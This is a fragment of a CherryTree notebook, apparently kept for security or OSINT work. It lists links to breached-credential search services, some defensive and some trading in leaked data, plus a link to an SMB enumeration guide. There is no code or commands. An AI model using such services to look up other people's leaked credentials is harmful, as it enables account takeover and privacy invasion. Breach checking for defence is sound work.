    <rich_text link="webs https://leakcheck.io/">https://leakcheck.io</rich_text>
    <rich_text>

</rich_text>
    <rich_text link="webs https://vigilante.pw/">https://vigilante.pw</rich_text>
    <rich_text>

</rich_text>
    <rich_text link="webs https://leakcheck.net/">https://leakcheck.net</rich_text>
    <rich_text>

</rich_text>
    <rich_text link="webs https://weleakinfo.to/">https://weleakinfo.to</rich_text>
    <rich_text>

</rich_text>
    <rich_text link="webs https://leakcorp.com/">https://leakcorp.com</rich_text>
    <rich_text>

</rich_text>
    <rich_text link="webs https://leakpeek.com/">https://leakpeek.com</rich_text>
    <rich_text>

</rich_text>
    <rich_text link="webs https://rslookup.com/">https://rslookup.com</rich_text>
    <rich_text>

</rich_text>
    <rich_text link="webs https://snusbase.com/">https://snusbase.com</rich_text>
    <rich_text>

</rich_text>
    <rich_text link="webs https://ghostproject.fr/">https://ghostproject.fr</rich_text>
    <rich_text>

</rich_text>
    <rich_text link="webs https://leakedsource.ru/">https://leakedsource.ru</rich_text>
    <rich_text>

</rich_text>
    <rich_text link="webs https://leak-lookup.com/">https://leak-lookup.com</rich_text>
    <rich_text>

</rich_text>
    <rich_text link="webs https://nuclearleaks.com/">https://nuclearleaks.com</rich_text>
    <rich_text>

</rich_text>
    <rich_text link="webs https://private-base.info/">https://private-base.info</rich_text>
    <rich_text>

</rich_text>
    <rich_text link="webs https://haveibeensold.app/">https://haveibeensold.app</rich_text>
    <rich_text>

</rich_text>
    <rich_text link="webs https://breachchecker.com/">https://breachchecker.com</rich_text>
    <rich_text>

</rich_text>
    <rich_text link="webs https://www.dehashed.com/">https://www.dehashed.com</rich_text>
    <rich_text>

</rich_text>
    <rich_text link="webs http://scatteredsecrets.com/">http://scatteredsecrets.com</rich_text>
    <rich_text>

</rich_text>
    <rich_text link="webs https://haveibeenpwned.com/">https://haveibeenpwned.com</rich_text>
    <rich_text>

</rich_text>
    <rich_text link="webs https://haveibeenpwned.com/">https://haveibeenpwned.com</rich_text>
    <rich_text>

</rich_text>
    <rich_text link="webs https://services.normshield.com/">https://services.normshield.com</rich_text>
    <rich_text>

</rich_text>
    <rich_text link="webs https://joe.black/leakengine.html">https://joe.black/leakengine.html</rich_text>
  </node>
  <node name="smb_enum" unique_id="93" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1663514056" ts_lastsave="1663563857">
    <rich_text link="webs https://www.hackingarticles.in/a-little-guide-to-smb-enumeration/">https://www.hackingarticles.in/a-little-guide-to-smb-enumeration/</rich_text>
  </node>
</cherrytree>
